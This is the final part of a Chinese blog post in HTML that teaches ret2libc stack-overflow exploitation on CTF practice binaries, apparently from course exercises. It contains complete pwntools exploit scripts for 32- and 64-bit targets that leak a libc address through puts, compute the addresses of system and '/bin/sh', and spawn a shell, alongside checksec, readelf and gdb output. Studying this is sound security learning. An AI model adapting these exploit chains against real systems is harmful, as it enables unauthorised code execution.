class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, puts_plt, start_addr, puts_got]) </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])  <span class="comment">#接收puts的真实地址，占4个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt:&#123;&#125;, puts_got: &#123;&#125;, start_addr: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt),<span class="built_in">hex</span>(puts_got), <span class="built_in">hex</span>(start_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_real_addr: &quot;</span>, <span class="built_in">hex</span>(puts_real_addr)) </span><br><span class="line"><span class="comment"># 计算 puts 在libc中的偏移值</span></span><br><span class="line">libc_puts_addr = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_puts_addr:&quot;</span>,<span class="built_in">hex</span>(libc_puts_addr))</span><br><span class="line"><span class="comment"># 计算libc的基地址 因为开启了 PIE所以每次都不一样 需要写在这里运行一次计算一次</span></span><br><span class="line">libc_real_addr = puts_real_addr -  libc_puts_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_real_addr:&quot;</span>,<span class="built_in">hex</span>(libc_real_addr))</span><br><span class="line"><span class="comment"># 计算 system 在libc中的偏移值</span></span><br><span class="line">libc_sys_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sys_addr = libc_real_addr + libc_sys_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr:&quot;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="comment"># 计算 /bin/sh 在libc中偏移量</span></span><br><span class="line">libc_bs_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">bs_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)) + libc_real_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_bs_addr:&quot;</span>,<span class="built_in">hex</span>(bs_addr))</span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, sys_addr, <span class="number">0x11111111</span>, bs_addr])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="7">
<li>exp 解释</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.我们现在知道 libc的版本所以直接用 <span class="string">&#x27;ELF()&#x27;</span> 的形式去加载他 后续我们需要获取<span class="string">&#x27;system&#x27;</span>的偏移以及<span class="string">&#x27;/bin/sh&#x27;</span>的偏移</span><br><span class="line">2.获取完程序本身的 <span class="string">&#x27;puts&#x27;</span> 函数的 <span class="string">&#x27;plt&#x27;</span> 表和 <span class="string">&#x27;got&#x27;</span>表 我们可以通过调用 <span class="string">&#x27;puts&#x27;</span> 函数的特性去把 <span class="string">&#x27;got&#x27;</span> 表的地址给他泄露出来 方便后续计算偏移 再加上linux的特性延迟导入 我们也必须先执行一遍 <span class="string">&#x27;puts&#x27;</span> 才会有 <span class="string">&#x27;got&#x27;</span> 表的初始化</span><br><span class="line">3.之后我们通过获取 <span class="string">&#x27;libc&#x27;</span> 里面的 <span class="string">&#x27;puts&#x27;</span> 函数 我们可以通过 <span class="string">&#x27;puts&#x27;</span> 在程序中的 <span class="string">&#x27;got&#x27;</span> 表的值去计算出 <span class="string">&#x27;libc&#x27;</span> 的基地址 毕竟全是依赖于这个库的</span><br><span class="line">4.既然拿到了基地址 那么 只需要获取 <span class="string">&#x27;system&#x27;</span> 的偏移不就可以计算出真正的 <span class="string">&#x27;system&#x27;</span> 函数的地址了 </span><br><span class="line">5.<span class="string">&#x27;bin/sh&#x27;</span>的获取方法也是同理</span><br><span class="line">6.接着构建栈帧发送<span class="string">&#x27;payload&#x27;</span>即可 因为我们上次<span class="string">&#x27;puts&#x27;</span>的返回地址是程序的入口 相当于又执行了一遍这个程序</span><br></pre></td></tr></table></figure>

<h2 id="ret2libc3-x64"><a href="#ret2libc3-x64" class="headerlink" title="ret2libc3_x64"></a>ret2libc3_x64</h2><ol>
<li>查属性 也是开启了 NX</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 checksec ret2libc_64</span><br><span class="line">[*] <span class="string">&#x27;/home/cccccchow/pwn/AAA/山化课程/day04-ret2libc/ret2libc3/ret2libc_64&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查文件属性 动态编译</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 file ret2libc_64</span><br><span class="line">ret2libc_64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60d15ef4be5c2352730bc0390234cd7780c0f138, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查文件入口 后续要用 或者直接在 gdb 里面 <code>info func</code> 也可以 一般就是 <code>_start</code></li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) ➜  ret2libc3 readelf -h ret2libc_64</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              EXEC (Executable file)</span></span><br><span class="line"><span class="string">  Machine:                           Advanced Micro Devices X86-64</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x401090</span></span><br><span class="line"><span class="string">  Start of program headers:          64 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          11616 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               64 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           56 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         12</span></span><br><span class="line"><span class="string">  Size of section headers:           64 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         31</span></span><br><span class="line"><span class="string">  Section header string table index: 30</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>IDA分析发现没有 <code>system</code> <code>/bin/sh</code> 之类的 这道题其实跟上道题差不多 唯一不同的就是传递参数的过程了所以我们还需要多弄一步就是 <code>pop rdi</code> 也就是从栈上把数据放到 <code>rdi</code> 寄存器里面 如下所示</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(ret2libc_64/ELF/x86_64)&gt; search pop rdi</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rdi</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2libc_64</span><br><span class="line">0x0000000000401293: pop rdi; ret; </span><br></pre></td></tr></table></figure>

<ol start="5">
<li>然后我们数据就都拿到了 exp如下所示</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  <span class="comment"># 开启调试信息</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc_64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc_64&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x401229\nc&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x401293</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload 泄露 read@got</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * offset</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Pls Input&quot;</span>)  <span class="comment"># 第一次提示</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只收一行输出（puts 打印 puts 的地址）</span></span><br><span class="line">leak = p.recvline().strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak raw:&quot;</span>, leak.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果太短，再试一下用 recv(n)</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(leak) &lt; <span class="number">6</span>:</span><br><span class="line">    leak = p.recvn(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_real_addr: &quot;</span>, <span class="built_in">hex</span>(puts_real_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 leak 计算 libc 基址</span></span><br><span class="line">libc_base = puts_real_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bs_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr:&quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bs_addr:&quot;</span>,<span class="built_in">hex</span>(bs_addr))</span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">b&#x27;a&#x27;</span> * offset</span><br><span class="line"></span><br><span class="line">payload2 += p64(<span class="number">0x40101a</span>) <span class="comment">#需要添加一个ret，仅仅用于栈平衡</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(bs_addr)</span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line">payload2 += p64(main_addr)  <span class="comment"># system 返回后跳转 main 避免崩溃</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Pls Input&quot;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="6">
<li>exp详解</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">1.我们现在知道 libc的版本所以直接用 <span class="string">&#x27;ELF()&#x27;</span> 的形式去加载他 后续我们需要获取<span class="string">&#x27;system&#x27;</span>的偏移以及<span class="string">&#x27;/bin/sh&#x27;</span>的偏移</span><br><span class="line">2.获取完程序本身的 <span class="string">&#x27;puts&#x27;</span> 函数的 <span class="string">&#x27;plt&#x27;</span> 表和 <span class="string">&#x27;got&#x27;</span>表 我们可以通过调用 <span class="string">&#x27;puts&#x27;</span> 函数的特性去把 <span class="string">&#x27;got&#x27;</span> 表的地址给他泄露出来 方便后续计算偏移 再加上linux的特性延迟导入 我们也必须先执行一遍 <span class="string">&#x27;puts&#x27;</span> 才会有 <span class="string">&#x27;got&#x27;</span> 表的初始化</span><br><span class="line">3.之后我们通过获取 <span class="string">&#x27;libc&#x27;</span> 里面的 <span class="string">&#x27;puts&#x27;</span> 函数 我们可以通过 <span class="string">&#x27;puts&#x27;</span> 在程序中的 <span class="string">&#x27;got&#x27;</span> 表的值去计算出 <span class="string">&#x27;libc&#x27;</span> 的基地址 毕竟全是依赖于这个库的</span><br><span class="line">4.既然拿到了基地址 那么 只需要获取 <span class="string">&#x27;system&#x27;</span> 的偏移不就可以计算出真正的 <span class="string">&#x27;system&#x27;</span> 函数的地址了 </span><br><span class="line">5.<span class="string">&#x27;bin/sh&#x27;</span>的获取方法也是同理</span><br><span class="line">6.接着构建栈帧发送<span class="string">&#x27;payload&#x27;</span>即可 因为我们上次<span class="string">&#x27;puts&#x27;</span>的返回地址是程序的入口 相当于又执行了一遍这个程序</span><br><span class="line">7.但是我们在构造<span class="string">&#x27;payload&#x27;</span>的时候 就不能跟32位程序一样了 必须得是用寄存器传递参数</span><br><span class="line">8.最后为什么加了一个<span class="string">&#x27;ret&#x27;</span>来保持堆栈平衡呢?</span><br><span class="line">	(1).x86_64 的函数调用规范要求调用前 rsp 必须是 16 字节对齐的。</span><br><span class="line">	(2).ret2libc 这类利用中，常常发现直接调用 system 会崩溃，因为栈没对齐导致调用约定不满足。</span><br><span class="line">	(3).所以常见套路是用一个短 gadget 做对齐</span><br><span class="line">9.以下是用 gdb 调试来看<span class="string">&#x27;rsp&#x27;</span>是否16位对齐</span><br><span class="line">	 0x40128e &lt;__libc_csu_init+005e&gt; pop    r13</span><br><span class="line">     0x401290 &lt;__libc_csu_init+0060&gt; pop    r14</span><br><span class="line">     0x401292 &lt;__libc_csu_init+0062&gt; pop    r15</span><br><span class="line"> →   0x401294 &lt;__libc_csu_init+0064&gt; ret    </span><br><span class="line">   ↳  0x766564e58750 &lt;system+0000&gt;    endbr64 </span><br><span class="line">      0x766564e58754 &lt;system+0004&gt;    <span class="built_in">test</span>   rdi, rdi</span><br><span class="line">      0x766564e58757 &lt;system+0007&gt;    je     0x766564e58760 &lt;__libc_system+16&gt;</span><br><span class="line">      0x766564e58759 &lt;system+0009&gt;    jmp    0x766564e582d0 &lt;do_system&gt;</span><br><span class="line">      0x766564e5875e &lt;system+000e&gt;    xchg   ax, ax</span><br><span class="line">      0x766564e58760 &lt;system+0010&gt;    sub    rsp, 0x8</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: <span class="string">&quot;ret2libc_64&quot;</span>, stopped 0x401294 <span class="keyword">in</span> __libc_csu_init (), reason: SINGLE STEP</span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x401294 → __libc_csu_init()</span><br><span class="line">[#1] 0x766564e58750 →  &lt;system+0&gt; endbr64 </span><br><span class="line">[#2] 0x401176 → frame_dummy()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  i r rsp</span><br><span class="line">rsp            0x7ffcef704be0      0x7ffcef704be0</span><br><span class="line">gef➤  </span><br><span class="line"></span><br><span class="line">10.判断是否16字节对齐，就是看这个值能不能被16整除，也就是看低4位（十六进制）是否为0：</span><br><span class="line">	(1).16的十六进制是0x10</span><br><span class="line">	(2).计算：0x7fff8b2f8b98 % 0x10</span><br><span class="line">	(3).看低位：0xb98，取最低一位16进制数字，就是 8。</span><br><span class="line">	(4).0x8 ≠ 0x0，说明 不是16字节对齐。</span><br></pre></td></tr></table></figure>





<h1 id="总结与思考"><a href="#总结与思考" class="headerlink" title="总结与思考"></a>总结与思考</h1><p>解决ret2libc这样的题目，关键就是把握两个payload的构建方法，理解如下关键公式的含义即可：</p>
<p><strong><code>函数的真实地址 = 基地址 + 偏移地址 </code></strong></p>
<p> 最后再次总结一下解题思路：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。</span><br><span class="line"></span><br><span class="line">2.找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略，实际题目要用到LibcSearch库）。</span><br><span class="line"></span><br><span class="line">3.根据libc库的版本可以很容易的确定puts函数的偏移地址。</span><br><span class="line"></span><br><span class="line">4.计算基地址。基地址 = puts函数的真实地址 - puts函数的偏移地址。</span><br><span class="line"></span><br><span class="line">5.根据libc函数的版本，确定system函数和<span class="string">&quot;/bin/sh&quot;</span>字符串在libc库中的偏移地址。 </span><br><span class="line"></span><br><span class="line">6.根据 真实地址 = 基地址 + 偏移地址 计算出system函数和<span class="string">&quot;/bin/sh&quot;</span>字符串的真实地址。</span><br><span class="line"></span><br><span class="line">7.再次构造合理的payload2，劫持程序的执行流程，劫持到system(<span class="string">&quot;/bin/sh&quot;</span>)的真实地址，从而拿到shell。</span><br></pre></td></tr></table></figure>




    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"># pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2025/06/06/pwn-ret2syscall/" rel="prev" title="pwn-ret2syscall">
      <i class="fa fa-chevron-left"></i> pwn-ret2syscall
    </a></div>
      <div class="post-nav-item">
    <a href="/2025/06/10/pwn-ret2csu/" rel="next" title="pwn-ret2csu">
      pwn-ret2csu <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-ret2libc"><span class="nav-number">1.</span> <span class="nav-text">pwn-ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">题目简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%88%E7%AE%80%E8%A6%81%E4%BA%86%E8%A7%A3%EF%BC%89"><span class="nav-number">1.3.</span> <span class="nav-text">前置知识（简要了解）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A"><span class="nav-number">1.3.1.</span> <span class="nav-text">延迟绑定</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2libc1"><span class="nav-number">1.4.</span> <span class="nav-text">ret2libc1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2libc2"><span class="nav-number">1.5.</span> <span class="nav-text">ret2libc2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2libc3"><span class="nav-number">1.6.</span> <span class="nav-text">ret2libc3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2libc3-x64"><span class="nav-number">1.7.</span> <span class="nav-text">ret2libc3_x64</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E4%B8%8E%E6%80%9D%E8%80%83"><span class="nav-number">2.</span> <span class="nav-text">总结与思考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Chow"
      src="https://octodex.github.com/images/steroidtocat.png">
  <p class="site-author-name" itemprop="name">Chow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Chow</span>
</div>

<!--
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>
-->

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
